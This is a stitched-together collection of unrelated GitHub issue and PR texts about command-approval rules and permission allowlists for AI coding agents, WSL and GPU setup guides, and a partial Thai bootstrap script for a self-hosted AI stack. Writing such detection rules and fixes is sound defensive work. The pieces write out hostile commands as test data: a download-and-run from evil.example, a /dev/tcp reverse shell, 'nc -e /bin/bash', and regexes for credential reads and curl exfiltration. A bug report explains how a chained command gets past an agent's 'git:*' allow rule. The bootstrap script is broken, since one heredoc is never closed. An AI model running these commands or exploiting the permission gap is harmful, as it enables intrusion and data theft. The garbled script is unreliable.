items.title: [DOCS] Follow redirect when downloading get-pmm.sh
items.body:
Ticket number: PMM-0

Feature build: SUBMODULES-0

The automated Docker migration steps in `pmm-upgrade/migrating_from_pmm_2.md` tell users to run:

```sh
curl -o get-pmm.sh https://www.percona.com/get/pmm
```

`https://www.percona.com/get/pmm` answers with a 302, and without `-L` curl saves the nginx "302 Found" HTML page as `get-pmm.sh`, so the next steps (`chmod +x`, `./get-pmm.sh ...`) fail.

The command now uses `curl -fsSL -o get-pmm.sh ...`, the same flags the Easy install page already uses for this URL. (The `-oL` suggested in the issue would treat `L` as the output file name, so I went with separate flags.)

Tested by running both commands: the old one writes the 302 HTML page, the new one writes the script (`#!/usr/bin/env bash`, passes `bash -n`). The change is a single line inside a code block.

- [ ] API Docs updated (not applicable)

Fixes #6046

items.title: Wire projects with `bash <hook>` instead of relying on chmod +x
items.body:
Aligns the documented wiring with what the last round of wiring actually had to do, and removes a failure mode along the way.

## The problem

The wire snippet told you to `chmod +x` the hook and register it as a bare command. That only holds when the copy inside the project keeps its executable bit — and both realistic ways a copy gets there drop it:

- `curl -o` writes mode `0644`, so the `chmod +x` line was load-bearing and easy to skip.
- A file committed through the GitHub contents API is **always** mode `100644`. That API has no parameter for the bit at all, so there is no way to do it right from there.

Either way the hook dies with `permission denied` at session start, which reads like a broken hook rather than a missing `chmod`. Five projects were wired through the API in this round and hit exactly that, which is why they already carry the `bash` form.

## The change

Invoke the hook as an argument to `bash`, so the bit stops mattering:

```json
{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/sync-skills.sh\"" }
```

Applied in three places:

- **`README.md`** — the `chmod +x` line is dropped from the wire snippet, the JSON snippet uses the `bash` form, and a short paragraph explains why the bit cannot be relied on.
- **`hook/settings.json`** — the canonical snippet projects copy.
- **`.claude/settings.json`** — this repo's own wiring, kept consistent.

## Nothing to migrate

Projects wired under the old form keep working, because their hook file does carry the bit. The README now says so explicitly, so the older form in those repos does not read as a bug.

## Testing

Reproduced the failure and the fix on a deliberately non-executable copy of the hook:

- direct invocation → `permission denied`, exit `126`
- `bash <path>` → `skills-sync: synced 236 skill file(s)`, all 236 files present

Both settings files were re-parsed as JSON after editing.

items.title: Bug: Bash allow rules match the raw compound command, so "git:*" silently auto-allows "git status && <any command>"
items.body:
### Describe the bug

`BashTool.match_rule` applies its prefix / wildcard / substring patterns to the **raw command string**:

https://github.com/agentscope-ai/agentscope/blob/main/src/agentscope/tool/_builtin/_bash.py — `match_rule()`

```python
if rule_content.endswith(":*"):
    prefix = rule_content[:-2].strip()
    return command.startswith(prefix + " ") or command == prefix
```

For a compound command, the whole string starts with the first subcommand's text, so an ALLOW rule `git:*` matches not only `git status` but also:

```
git status && echo pwned > /tmp/pwned
git commit -m "x" && curl http://evil.example -o /tmp/p && chmod +x /tmp/p && /tmp/p
```

### Why this is practically reachable

`BashTool.generate_suggestions` itself proposes ALLOW rules in the `prefix:*` format (e.g. `git commit:*`) extracted from real usage — so users who accept the framework's own suggestions end up with exactly these rules.

### Why the safety net does not catch it

In DEFAULT mode the engine runs `check_permissions` before allow-rule matching. Its bypass-immune checks only cover: command substitution / process substitution / control-flow AST nodes, a short dangerous-pattern list (`rm -rf`, `dd`, `chmod 777`, ...), sensitive config files (`.bashrc`, `.env`, `.ssh/...`), and `rm` on system directories. A second command like `curl ... -o /tmp/x && chmod +x /tmp/x` or `echo x >> /tmp/file` passes all of them, and the compound command then reaches `_check_allow_rules`, where the `git:*` rule auto-ALLOWs the entire string.

### Expected behavior

A permission rule for Bash should only cover a compound command when it covers **every** subcommand (this is also what `split_compound_command()` in `_bash_parser.py` already supports — `is_read_only_command()` uses it, but `match_rule()` does not).

### Suggested fix

In `BashTool.match_rule`, split the command with the AST-based parser and require the pattern to match every subcommand. Single-command matching is unchanged.

I have a fix ready with regression tests and will submit a PR shortly.

items.title: feat: agent-egress rules for metadata access, storage uploads and namespace escalation
items.body:
Adds detections for the agent behaviors described in #926.

New pack `agent-egress` (0.1.0, `defaultPolicy: block`):
- `cloud-metadata-access` (critical): a network use of 169.254.169.254, fd00:ec2::254, metadata.google.internal or 100.100.100.200. That means a URL in an executable field (WebFetch `url`), a network client in the command (curl, wget, nc, socat, httpie, PowerShell web requests), or an interpreter one-liner requesting it.
- `object-storage-file-upload` (critical): curl/wget sending a file (`-T`, `--upload-file`, `-d @file`, `-F x=@file`, `@-`), `$(env)` or `$(printenv)`, or wget `--post-file`/`--body-file`, to S3, Google Cloud Storage, Azure Blob, R2 or Alibaba OSS.
- `agent-probe-host` (critical): the two hosts named in the write-up, on a network use.
- `unshare-user-namespace` (high): `unshare` with `-U`, `-r`, `-c` (including clusters such as `-Urm`), `--user` or `--map-*-user`. Mount-only and network-only namespaces (`unshare -m`, `unshare --net`) are not flagged.

`command-risk` (0.2.0 to 0.3.0, default `warn`):
- `object-storage-upload`: curl/wget sending data to an object storage host.
- `alibaba-oss-host`: any other `oss-*.aliyuncs.com` host.
- `download-then-execute`: `curl -o`/`wget -O` to a path, then running that path (sh, bash, source, chmod +x, python, perl, node, or a direct run).
- `recon-then-egress`: recon (`cat /etc/resolv.conf`, `which … curl`, `ls -la /tmp`, `uname -a`, bare `id`/`hostname`) and a curl/wget/nc call in one command. Recon alone is silent.

Notes for review:
- A rule's action comes from its pack's `defaultPolicy`, so the four block-intended rules live in their own pack. An install that already has packs picks up `agent-egress` at `block` through `recordInventory` (covered by "a pack added beside unchanged ones still takes its defaultPolicyId"). The `command-risk` additions arrive as a normal pack update.
- `appliesTo` can't limit a rule to executable fields, so the `agent-egress` patterns require a network use. Searches (`grep`/`rg`), subagent prompts, and code or docs that merely mention an address stay silent. Each of these has a negative fixture.
- `feat/credential-read-guard` (#916) also bumps `command-risk` to 0.3.0. Whichever lands second needs 0.4.0 and a regenerated bundle; I'll rebase this one if #916 merges first.
- Known gaps: `curl -O` (file name taken from the URL) followed by a run isn't linked to the download, and an upload whose host is in a shell variable isn't matched. #924 covers the general case.

Checks: fixture tests for both packs, ReDoS and parse suites, the bundled-pack drift test and prettier pass locally. Typecheck, lint and test for detections, plugin-sdk and their dependents pass on a full run. Against the rebuilt Claude Code plugin, the 17 calls from the issue now give 14 deny and 3 silent (recon alone, which the transcript history still records as ordinary tool calls). A plain GitHub API call stays silent.

Closes #926

items.title: staged-execution warns on almost every write-then-run workflow
items.body:
Found in the 30-day session replay (#589); not covered by that PR.

`staged-execution` recorded about **900 rows in 30 days**: 537 from a file the agent wrote, 370 from a redirect. In nearly all of them the agent ran a script it had just written itself, for example `cat > /tmp/probe.py <<'EOF' … EOF` and then `python3 /tmp/probe.py`, or `chmod +x run.sh && bash run.sh`. That is the normal way coding agents work, so the warning teaches users to ignore it.

**Proposed:** only flag running a file whose content came from untrusted input. That means a file written by a fetch (`curl -o`, `wget -O`), with tags inherited through provenance (`untrusted_content` / `via.artifact`), or whose body came from tool output. A script the agent wrote itself would no longer count. The cross-call dropper case (fetch now, run later) stays covered, because the fetch marks the file.

Also note: `evasion-detection` builds on these findings (25 of its 94 historical rows were "possible evasion of staged-execution"). See the evasion issue.

items.title: curl: option -: is unknown when passing a quoted command string to bsub (LSF)
items.body:
**Answer**
```text
The inner escaped quotes are consumed by the outer shell(s) (local ssh + remote shell), so bsub receives the -w text unquoted and curl sees words like '->' as options. Do not nest quotes in bsub command strings: write the commands to a script (printf/heredoc into job.sh, chmod +x) and submit `bsub ... ./job.sh`, or feed the job script on stdin with `bsub < job.sh` using #BSUB lines. Check the submitted command in the job report's first lines.
```

**Question**
```text
Submitting a one-liner through ssh + bsub:

bsub -q short -o out.%J "hostname; curl -s -o /dev/null -w \"code: %{http_code}\n\" https://example.org"

The job EXITs with code 2 and the .err file says:
curl: option -: is unknown
curl: try 'curl --help' for more information
```

items.title: fix: harden dangerous command detection for RCE and supply chain attacks

labels.name: sweeper:risk-security-boundary
labels.description: Sweeper risk: may affect sandboxing, auth, credentials, or sensitive data

labels.name: sweeper:risk-compatibility
labels.description: Sweeper risk: may break existing users, config, migrations, defaults, or upgrades

labels.name: sweeper:blast-moderate
labels.description: Sweeper blast radius: moderate — a subsystem or single platform

items.body:
## Summary

Expands the dangerous command approval patterns to catch attack vectors that were previously undetected. This is a **defense-in-depth improvement** to the existing approval system (soft block, not hard block).

### What changed

**15 new patterns** added to `tools/approval.py`:

1. **Pipe-to-shell via sudo** — `curl ... | sudo bash`, `curl ... | sudo -E bash -` bypassed the old regex because `sudo` sat between pipe and shell
2. **Pipe-to-interpreter** — `curl ... | python3`, `curl ... | perl`, `curl ... | node` were completely undetected
3. **Download-and-execute chains** — `curl -o /tmp/x && chmod +x /tmp/x && /tmp/x` was undetected
4. **Temp directory execution** — `bash /tmp/script.sh`, `python3 /tmp/payload.py`, `chmod +x /tmp/binary` were undetected
5. **Download to temp staging** — `curl -o /tmp/x` was undetected (common malware staging pattern)
6. **Clone-and-install chains** — `git clone && make install`, `git clone && pip install .` were undetected
7. **Supply chain package install** — `pip install https://evil.com/pkg`, `pip install --extra-index-url`, `npm install --registry` were undetected

**54 new tests**, 0 false positives on normal operations (`pip install requests`, `bash ./script.sh`, `curl -o output.json`, `git clone` alone, etc.).

### Limitations (honest)

- This is a **soft block** — patterns trigger an approval prompt, they don't hard-block. The user can approve with `[o]nce`, `[s]ession`, or `[a]lways`.
- Approval is **skipped entirely** in: container backends, YOLO mode, `approvals.mode=off`, non-interactive sessions.
- The `[a]lways` option saves the pattern key to `command_allowlist` in config.yaml — all future commands matching the same pattern category run without prompting.
- These patterns only cover `terminal_tool` execution. Browser downloads (`acceptDownloads=true` in Playwright) are not affected by this change.
- Pattern-based detection is inherently bypassable with creative command construction. This is a speed bump, not a wall.

### What this does NOT fix

- Browser download protection (no `acceptDownloads=false`)
- Web content → terminal injection sanitization (relies on LLM judgment)
- Generic `pip install <package>` or `npm install <package>` (only URL/custom-registry variants are flagged)

## Test plan

- [x] All 151 approval tests pass (54 new + 97 existing)
- [x] All 78 command guard tests pass (no regression)
- [x] All 78 skills guard tests pass (no regression)
- [x] Zero false positives verified for: `pip install requests`, `npm install lodash`, `bash ./script.sh`, `python3 test.py`, `chmod +x ./build.sh`, `curl -o output.json https://api.com/data`, `git clone` alone, `make install` alone

# Setting up urpx-rate-plans in WSL

For `Ubuntu-22.04` in WSL, written on 2026-10-15.  You can paste each block as-is, and the `sudo` steps will prompt for your Ubuntu password.

## 0.  Open Ubuntu (from PowerShell or Windows Terminal)

“`powershell
wsl -d Ubuntu-22.04
```

## 1.  System packages

“`bash
sudo apt update
sudo apt upgrade
sudo apt install -y openjdk-21-jdk rlwrap jq git curl unzip python3-venv python3-pip poppler-utils
java -version          # should report 21
```

`poppler-utils` provides `pdftotext`.

## 2.  Clojure CLI, plus babashka and clj-kondo

babashka and clj-kondo are optional; the gate runs them only when present.

“`bash
cd /tmp
curl -L -O https://github.com/clojure/brew-install/releases/latest/download/linux-install.sh
chmod +x linux-install.sh && sudo ./linux-install.sh && rm linux-install.sh
clojure --version

curl -sL https://raw.githubusercontent.com/babashka/babashka/master/install -o install-bb && chmod +x install-bb && sudo ./install-bb && rm install-bb
curl -sL https://raw.githubusercontent.com/clj-kondo/clj-kondo/master/script/install-clj-kondo -o install-kondo && chmod +x install-kondo && sudo ./install-kondo && rm install-kondo
```

## 3.  Git settings

These keep line endings as LF, avoiding Windows CRLF churn.

“`bash
git config --global user.name "{user name}"
git config --global user.email "{user email}"
git config --global core.autocrlf input
```

## 4.  Clone both repositories into the Linux filesystem and bring the Windows work across

“`bash
mkdir -p ~/src && cd ~/src
git clone https://github.com/{**Forked GitHub account**}/urpx-rate-plans.git
git clone https://github.com/urpx-org/urpx.git          # full clone; the gate needs v0.5.1, v0.2.1 and cd13ce8a

items.title: feat: replace --dangerously-skip-permissions with safe tool allowlists
items.body:
## Summary

Replaces `--dangerously-skip-permissions` across all spawn paths with granular `--allowedTools` allowlists and expanded `permissions.allow`/`permissions.deny` lists.

### The Problem

`--dangerously-skip-permissions` bypasses **all** Claude Code permission prompts — arbitrary shell execution, unrestricted file access, uncontrolled network requests. Every spawn path (swarm, hive-mind, SPARC, GitHub, executor, coordinator, background-executor) defaulted to this flag. Any agent in a swarm could run arbitrary commands with zero restrictions.

### The Fix

- **New module** `src/cli/utils/allowed-tools.js` — central allowlist definitions for each mode (SWARM, SPARC, GITHUB)
- **All spawn paths** now use `--allowedTools` with mode-specific tool lists instead of blanket permission bypass
- **Settings template** expanded: allow list 16→52 patterns, deny list 4→16 patterns (blocks `rm -rf`, `sudo`, `curl|bash`, `chown`, `chmod 777`, etc.)
- **Environment detector** recommends `--non-interactive` instead of `--dangerously-skip-permissions`
- **`SECURITY.md`** documents the new model, migration guide, and known limitations

### Key Changes

| File | Change |
|------|--------|
| `src/cli/utils/allowed-tools.js` | NEW — central allowlist definitions |
| `src/cli/simple-commands/swarm.js` | `--dangerously-skip-permissions` → `--allowedTools` |
| `src/cli/simple-commands/hive-mind.js` | Same |
| `src/cli/simple-commands/sparc.js` | Same, `--enable-permissions` uses allowlist |
| `src/cli/simple-commands/github.js` | Same, unconditional allowlist |
| `src/cli/commands/claude.ts` | `--no-permissions` → safe allowlist fallback |
| `src/cli/commands/index.ts` | Same, batch mode default allowlist |
| `src/swarm/executor.ts` | Same |
| `src/swarm/executor-v2.ts` | Same, unconditional allowlist |
| `src/swarm/coordinator.ts` | Same, SWARM_ALLOWED_TOOLS (includes MCP) |
| `src/coordination/background-executor.ts` | Same |
| `scripts/claude-sparc.sh` | Same, SPARC tool list |
| `init/templates/settings.json` | Expanded allow/deny lists |
| `src/cli/utils/environment-detector.ts` | `--non-interactive` instead of skip-permissions |

### Known Limitation

The allow list permits `curl -o *` and `chmod +x *` separately. An agent could chain `curl -o /tmp/x && chmod +x /tmp/x && /tmp/x` as three allowed commands. The deny list blocks pipe-to-shell but not sequential download-execute chains. Documented in SECURITY.md. Mitigate in production via custom settings.json host restrictions.

### Testing

- All spawn paths verified: every `claude` invocation now passes `--allowedTools`
- No bare spawns (zero tool restrictions) in any mode
- No `--dangerously-skip-permissions` in any active code path
- Tests updated to expect `--non-interactive` and `--allowedTools`

Scope: crates/tetsu-comp

## Question
Run the hardware acceptance of the multi-GPU tty backend: a single software GPU in the VM, explicit sync on a capable GPU, and both GPUs on the GS66. The backend has never run on hardware.

## Checklist
**H1, single GPU in the VM**
1. On the host: `RUSTUP_TOOLCHAIN=1.99.1 cargo build -p tetsu-comp --release --locked`, then `python3 -m http.server -d target/release 8000`.
2. `tools/vm/tetsu-vm start --iso <arch iso> --gui --mem 4096`.
3. In the guest: `pacman -Sy --noconfirm seatd libinput mesa foot`, `curl -O http://10.0.2.2:8000/tetsu-comp`, `chmod +x tetsu-comp`, then from the VT `./tetsu-comp --backend tty -- foot`.
4. The log names the single (software) render device and `explicit sync disabled (<reason>)`; foot draws and takes input; Ctrl+Alt+Backspace exits cleanly.

**H2 (optional), explicit sync on the dev laptop**
5. From a free VT: `tetsu-comp --backend tty -- foot`. In foot, `wayland-info | grep -E 'zwp_linux_dmabuf_v1|wp_linux_drm_syncobj_manager_v1'` lists both, and `WAYLAND_DEBUG=1 vkcube --wsi wayland 2>&1 | grep -m1 set_acquire_point` prints a line.

**H3, both GPUs on the GS66** (NVIDIA >= 560.35.3, `nvidia_drm.modeset=1`, external monitor on the dGPU port connected before start)
6. From a VT: `tetsu-comp --backend tty -- foot`. The log shows the render device on the NVIDIA render node (`automatic: drives an external output`), the external output with `cross-gpu=false` and the eDP panel with `cross-gpu=true` (node names in the short form, e.g. `renderD129`).
7. Both outputs draw; a window moved to each output renders; `explicit sync enabled` is logged; `wayland-info` lists the syncobj manager; `vkcube` under `WAYLAND_DEBUG` shows `set_acquire_point` on each output.
8. Two minutes of `vkcube` on each output with no corruption, freezes or flicker of feedback.
9. Unplug the external monitor and restart: the render device is the iGPU.
10. With `[render] explicit_sync = "off"`: the syncobj global is absent.
11. With `render.device` set to the iGPU node: it is honoured (`set`).

## Done when
Every step passes, or a failing step is captured as a `bug` on this map with `Regression of:` the parent.

items.title: tools/approval.py: Add reverse shell, download-execute, and credential read patterns to DANGEROUS_PATTERNS
items.body:
## Description

The DANGEROUS_PATTERNS list in `tools/approval.py` currently covers 47 command patterns including `rm -rf`, `curl|bash` pipe, `bash -c`, and various destructive operations. However, several categories of commands that are commonly considered dangerous in agent security contexts are not currently detected:

### 1. Reverse shell patterns

Bash `/dev/tcp` reverse shells are a standard attack technique. The system currently detects `bash -c` (via the `-c flag` pattern) but does not detect the direct `bash -i >& /dev/tcp/...` form, which achieves the same result without using `-c`.

Other reverse shell tools (`nc -e`, `socat EXEC`) are also not detected.

**Suggested patterns:**
```python
(r'\b(bash|sh|zsh)\s+(-\w+\s+)*.*[<>].*(/dev/tcp/|/dev/udp/)', "reverse shell via /dev/tcp"),
(r'\bnc\b.*-e\s+/?(bin/)?(bash|sh)\b', "reverse shell via netcat -e"),
(r'\bsocat\b.*EXEC\s*:\s*/?(?:bin/)?(bash|sh)', "reverse shell via socat"),
```

### 2. Two-stage download-execute

The system detects `curl URL | bash` (pipe to shell) but not `curl -o file && bash file` (save then execute). This is a trivial syntactic variant of the same attack.

**Suggested pattern:**
```python
(r'\b(curl|wget)\b.*-[oO]\s+\S+.*[;&|]+\s*(bash|sh|chmod\s+\+x)\b', "download then execute"),
```

### 3. Credential file read

`cat ~/.hermes/.env` is not in DANGEROUS_PATTERNS. While the agent has unrestricted shell access by design (per SECURITY.md), adding detection for credential file reads provides a defense-in-depth signal, especially in multi-turn conversations where the agent might be influenced by earlier context.

**Suggested patterns:**
```python
(r'\b(cat|head|tail|less|more|bat|strings)\b.*\.hermes/\.env\b', "read hermes credential file"),
(r'\b(cat|head|tail|less|more|bat|strings)\b.*\.hermes/auth\.json\b', "read hermes OAuth tokens"),
```

### 4. Sudo with stdin password

`sudo -S` (read password from stdin) is a privilege escalation pattern that is not currently detected. Adding it provides visibility when the agent attempts to use elevated privileges.

**Suggested pattern:**
```python
(r'\bsudo\s+-S\b', "sudo with stdin password (privilege escalation risk)"),
```

### 5. Data exfiltration via curl

`curl -d @file` sends file contents to a remote server. This is not currently detected.

**Suggested pattern:**
```python
(r'\bcurl\b.*(-d\s+@|-F\s+\S*=@|--data-binary\s+@)', "curl file upload (potential data exfiltration)"),
```

## Pattern Consistency

These suggestions address inconsistencies in the current pattern list:

| Detected | Not detected (same attack) |
|----------|---------------------------|
| `curl URL \| bash` | `curl -o file && bash file` |
| `bash -c "cmd"` | `bash -i >& /dev/tcp/...` |
| `python3 -c "..."` | `nc -e /bin/bash host port` |
| `chmod +x && ./script` | `curl -o script && bash script` |

## Verification

The following one-liner verifies which commands are detected vs not:

```bash
cd <hermes-root>
python3 -c "
from tools.approval import detect_dangerous_command, detect_hardline_command
cmds = [
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'nc -e /bin/bash host 4444',
    'curl -o /tmp/p.sh https://example.com/p && bash /tmp/p.sh',
    'curl https://example.com/x | bash',
    'cat ~/.hermes/.env',
    'sudo -S id',
]
for c in cmds:
    hl,_ = detect_hardline_command(c)
    dg,_,_ = detect_dangerous_command(c)
    print(f'{\"DETECTED\" if hl or dg else \"BYPASS\":8s} | {c}')
"
```

## Impact

These are all defense-in-depth enhancements. The approval system is documented as a "core security boundary" (SECURITY.md §2). Expanding its coverage to include these standard attack patterns improves the security posture, particularly for deployments using messaging platform gateways where the user may not see individual command approvals in real time.

## Backward Compatibility

Adding new patterns to DANGEROUS_PATTERNS only affects commands that were previously unchecked. Users with `approvals.mode: "off"` or per-command allowlist entries are not affected. No configuration changes needed.

It's interesting that this got unnoticed so far (tested on amazon linux, ubuntu). Based on the documentation https://www.parca.dev/docs/quickstart?environment=binary to download the agent (binary) you have to use the command below: 

```
curl -sL https://github.com/parca-dev/parca-agent/releases/download/v0.40.2/parca-agent_0.40.2_`uname -s`_`uname -m` chmod +x ./parca-agent*
```

1. This won't download the file, the -o flag is missing
2. Potentially giving too much execute rights (chmod on ./parca-agent*) on all files that start with string "parca-agent..."
3. Always quote URLs
4. (optional) chmod u+x would be actually sufficient enough to run the command, since parca-agent needs to be started with root/sudo anyway

The corrected command (should usually work in all environments) would look like: 
```
curl -o parca-agent -sL "https://github.com/parca-dev/parca-agent/releases/download/v0.40.2/parca-agent_0.40.2_$(uname -s)_$(uname -m)" && chmod u+x ./parca-agent
```

    -d "{\"points\":[{\"id\":$ID,\"vector\":$VEC,\"payload\":{\"path\":\"$f\",\"preview\":\"${CONTENT:0:200}\"}}]}" \
    >/dev/null

  echo "  ✓ $f"
  ID=$((ID+1))
done

📦 CK-NEXUS AI Stack — Consolidated & Organized

โครงสร้างเดียวจบ — ทุกอย่างที่คุยกันมาจัดเป็นระเบียบ พร้อม deploy

---

🗂️ โครงสร้างโฟลเดอร์

```
/root/cknexus-ai-stack/
├── README.md                    ← คู่มือหลัก
├── MANIFEST.json                ← metadata + checksums
├── 00-prereq/
│   └── check.sh                 ← ตรวจ RAM/disk/docker
├── 01-env/
│   ├── .env.template            ← template (safe commit)
│   └── setup-env.sh             ← interactive prompt
├── 02-install/
│   ├── 01-ollama.sh             ← local LLM
│   ├── 02-qdrant.sh             ← vector DB
│   ├── 03-n8n-env.sh            ← n8n integration
│   └── 99-verify.sh             ← health check
├── 03-workflows/
│   ├── free-ai-assistant.json   ← Smart Router
│   ├── multi-agent.json         ← Multi-agent orchestration
│   └── ticket-triage.json       ← Ticket classification
├── 04-rag/
│   ├── qdrant-init.sh           ← สร้าง collection
│   ├── index-evidence.sh        ← index CK-NEXUS evidence
│   └── query.sh                 ← ทดสอบ search
├── 05-clients/
│   ├── continue-config.json     ← VS Code AI
│   └── cli-chat.sh              ← CLI chat
├── 06-ops/
│   ├── health.sh                ← ตรวจทุก service
│   ├── backup.sh                ← backup stack
│   └── logs.sh                  ← ดู log รวม
├── install.sh                   ← MASTER installer
└── uninstall.sh                 ← rollback
```

---

🚀 ชุดเดียวจบ — สร้างทั้งหมด

Copy บล็อกนี้ทั้งหมด วางใน terminal — จะสร้างโครงสร้าง + ไฟล์ + รัน installer

```bash
cat > /root/bootstrap-cknexus-ai.sh <<'BOOTSTRAP'
#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════
#  CK-NEXUS AI Stack — Bootstrap
#  สร้างโครงสร้าง + ไฟล์ทั้งหมด + รัน installer
# ══════════════════════════════════════════════════════════════
set -euo pipefail

BASE=/root/cknexus-ai-stack
say(){ echo -e "\033[1;34m▶\033[0m $*"; }
ok(){  echo -e "\033[1;32m✓\033[0m $*"; }

say "สร้างโครงสร้างที่ $BASE"
mkdir -p $BASE/{00-prereq,01-env,02-install,03-workflows,04-rag,05-clients,06-ops}

# ─────────────────────────────────────────────────────────────
# README.md
# ─────────────────────────────────────────────────────────────
cat > $BASE/README.md <<'README'
# CK-NEXUS AI Stack

ระบบผู้ช่วย AI ฟรี 100% — self-hosted บน VPS
ใช้ n8n + Ollama + Gemini + Groq + Qdrant

## Quick Start

    cd /root/cknexus-ai-stack
    ./install.sh

## โครงสร้าง

- 00-prereq/   ตรวจสภาพแวดล้อม
- 01-env/      จัดการ API keys
- 02-install/  ติดตั้ง services
- 03-workflows/ n8n workflows (import เข้า n8n)
- 04-rag/      Qdrant + embeddings
- 05-clients/  CLI tools + IDE config
- 06-ops/      health, backup, logs

## Services

| Service  | Port        | คำสั่ง |
|----------|-------------|--------|
| n8n      | 5678        | systemctl status n8n |
| Ollama   | 11434       | systemctl status ollama |
| Qdrant   | 6333        | docker logs qdrant |

## คำสั่งบ่อย

    ./06-ops/health.sh           # ตรวจทุก service
    ./05-clients/cli-chat.sh "สวัสดี"  # chat ผ่าน webhook
    ./06-ops/backup.sh           # backup stack
    ./06-ops/logs.sh             # ดู log รวม

## Provider fallback

gemini → groq → ollama (อัตโนมัติ)

## ลิงก์

- n8n:    http://127.0.0.1:5678  (SSH tunnel)
- Qdrant: http://127.0.0.1:6333/dashboard
README

# ─────────────────────────────────────────────────────────────
# 00-prereq/check.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/00-prereq/check.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
echo "══════ สภาพแวดล้อม ══════"
echo "Host:  $(hostname)"
echo "User:  $(whoami)"
echo "Kernel: $(uname -r)"
echo
echo "── CPU ──"
nproc
echo
echo "── RAM ──"
free -h
RAM_MB=$(free -m | awk '/^Mem:/{print $2}')
SWAP_MB=$(free -m | awk '/^Swap:/{print $2}')
echo "RAM: ${RAM_MB}MB  Swap: ${SWAP_MB}MB"
if [ "$RAM_MB" -lt 3500 ]; then
  echo "⚠  RAM < 3.5GB → ข้าม Ollama"
fi
echo
echo "── Disk ──"
df -h /root
echo
echo "── Docker ──"
docker --version 2>/dev/null || echo "✗ ไม่มี Docker"
docker ps --format 'table {{.Names}}\t{{.Status}}' 2>/dev/null || true
echo
echo "── Services ──"
for svc in n8n ollama docker postgresql redis-server; do
  printf "%-15s : %s\n" "$svc" "$(systemctl is-active $svc 2>/dev/null || echo n/a)"
done
echo
echo "── Tools ──"
for t in node npm python3 curl jq git; do
  printf "%-10s : %s\n" "$t" "$(command -v $t >/dev/null && $t --version 2>&1 | head -1 || echo 'missing')"
done
S
chmod +x $BASE/00-prereq/check.sh

# ─────────────────────────────────────────────────────────────
# 01-env/setup-env.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/01-env/setup-env.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
ENV_FILE=/root/.ai-providers.env

echo "══════ ตั้งค่า AI Providers ══════"
echo "Gemini:     https://aistudio.google.com/app/apikey"
echo "Groq:       https://console.groq.com/keys"
echo "OpenRouter: https://openrouter.ai/keys  (optional)"
echo

read -rsp "GEMINI_API_KEY (Enter=skip): "     GEMINI_API_KEY;     echo
read -rsp "GROQ_API_KEY (Enter=skip): "       GROQ_API_KEY;       echo
read -rsp "OPENROUTER_API_KEY (Enter=skip): " OPENROUTER_API_KEY; echo

GEMINI_API_KEY=${GEMINI_API_KEY//[[:space:]]/}
GROQ_API_KEY=${GROQ_API_KEY//[[:space:]]/}
OPENROUTER_API_KEY=${OPENROUTER_API_KEY//[[:space:]]/}

install -m 600 /dev/null "$ENV_FILE"
{
  echo "# AI Providers — $(date -u)"
  [[ -n $GEMINI_API_KEY     ]] && echo "GEMINI_API_KEY=$GEMINI_API_KEY"
  [[ -n $GROQ_API_KEY       ]] && echo "GROQ_API_KEY=$GROQ_API_KEY"
  [[ -n $OPENROUTER_API_KEY ]] && echo "OPENROUTER_API_KEY=$OPENROUTER_API_KEY"
  echo "OLLAMA_BASE_URL=http://127.0.0.1:11434"
  echo "OLLAMA_MODEL=llama3.2:3b"
  echo "EMBED_MODEL=nomic-embed-text"
  echo "QDRANT_URL=http://127.0.0.1:6333"
  echo "AI_PRIMARY=gemini"
  echo "AI_FALLBACK_1=groq"
  echo "AI_FALLBACK_2=ollama"
} > "$ENV_FILE"
chmod 600 "$ENV_FILE"

echo "✓ บันทึก $ENV_FILE ($(stat -c '%A %s' $ENV_FILE))"
S
chmod +x $BASE/01-env/setup-env.sh

cat > $BASE/01-env/.env.template <<'T'
# AI Providers — อย่า commit ค่าจริง
GEMINI_API_KEY=
GROQ_API_KEY=
OPENROUTER_API_KEY=
OLLAMA_BASE_URL=http://127.0.0.1:11434
OLLAMA_MODEL=llama3.2:3b
EMBED_MODEL=nomic-embed-text
QDRANT_URL=http://127.0.0.1:6333

# ─────────────────────────────────────────────────────────────
# 02-install/01-ollama.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/02-install/01-ollama.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
RAM_MB=$(free -m | awk '/^Mem:/{print $2}')
if [ "$RAM_MB" -lt 3500 ]; then
  echo "⚠  RAM ${RAM_MB}MB < 3.5GB — ข้าม Ollama"
  exit 0
fi
if command -v ollama >/dev/null 2>&1; then
  echo "✓ Ollama มีอยู่แล้ว: $(ollama --version 2>&1 | head -1)"
else
  echo "▶ ติดตั้ง Ollama..."
  curl -fsSL https://ollama.com/install.sh | sh
fi
systemctl enable --now ollama
sleep 3
systemctl is-active ollama && echo "✓ ollama active"
echo "▶ ดึงโมเดล..."
ollama pull llama3.2:3b       || echo "⚠  pull llama3.2:3b ล้มเหลว"
ollama pull nomic-embed-text  || echo "⚠  pull nomic-embed-text ล้มเหลว"
ollama list
S
chmod +x $BASE/02-install/01-ollama.sh

# ─────────────────────────────────────────────────────────────
# 02-install/02-qdrant.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/02-install/02-qdrant.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
if docker ps --format '{{.Names}}' | grep -q '^qdrant$'; then
  echo "✓ Qdrant already running"
else
  mkdir -p /root/qdrant_data
  docker run -d --name qdrant --restart unless-stopped \
    -p 127.0.0.1:6333:6333 \
    -v /root/qdrant_data:/qdrant/storage \
    qdrant/qdrant:latest
  sleep 3
fi
docker ps --format 'table {{.Names}}\t{{.Status}}' | grep qdrant
curl -s http://127.0.0.1:6333/collections | head -c 200; echo
echo "✓ Qdrant: http://127.0.0.1:6333"
S
chmod +x $BASE/02-install/02-qdrant.sh

# ─────────────────────────────────────────────────────────────
# 02-install/03-n8n-env.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/02-install/03-n8n-env.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
mkdir -p /etc/systemd/system/n8n.service.d
cat > /etc/systemd/system/n8n.service.d/30-ai-providers.conf <<'CONF'
[Service]
EnvironmentFile=-/root/.ai-providers.env
CONF
systemctl daemon-reload
if systemctl is-active --quiet n8n; then
  systemctl restart n8n
  sleep 5
fi
echo "✓ n8n=$(systemctl is-active n8n)"
